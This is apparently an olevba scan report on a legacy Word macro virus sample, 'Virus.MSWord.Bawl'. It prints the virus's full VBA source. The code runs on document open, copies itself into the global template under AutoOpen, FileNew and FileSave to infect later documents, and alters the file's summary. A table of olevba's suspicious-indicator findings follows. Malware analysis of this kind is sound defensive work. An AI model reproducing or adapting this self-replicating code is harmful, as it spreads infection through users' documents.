olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bawl-38ce8a9b43a38b8479ba68a5507067fdd169d176
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bawl-38ce8a9b43a38b8479ba68a5507067fdd169d176 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUToOpEn.bas 
in file: Virus.MSWord.Bawl-38ce8a9b43a38b8479ba68a5507067fdd169d176 - OLE stream: 'Macros/VBA/aUToOpEn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Victory is ours. Created by Cheezhed

On Error GoTo -1: On Error GoTo ErrorHandler

     WordBasic.FileSummaryInfo Subject:="Green Bay Packers -- Super Bowl XXXI Champions"

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":aUToOpEn"

     WordBasic.MacroCopy MacName$, "Global:aUToOpEn"
     WordBasic.MacroCopy MacName$, "Global:FileNew"
     WordBasic.MacroCopy MacName$, "Global:FileSave"

ErrorHandler:

On Error GoTo -1: On Error GoTo aUToOpEnHandler
     MacName$ = FName$ + ":aUToOpEn"
     WordBasic.MacroCopy "Global:aUToOpEn", MacName$
aUToOpEnHandler:

On Error GoTo -1: On Error GoTo FileNewHandler
     MacName$ = FName$ + ":FileNew"
     WordBasic.MacroCopy "Global:FileNew", MacName$
FileNewHandler:

On Error GoTo -1: On Error GoTo FileSaveHandler
     MacName$ = FName$ + ":FileSave"
     WordBasic.MacroCopy "Global:FileSave", MacName$
FileSaveHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Go Pack Go!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUToOpEn            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

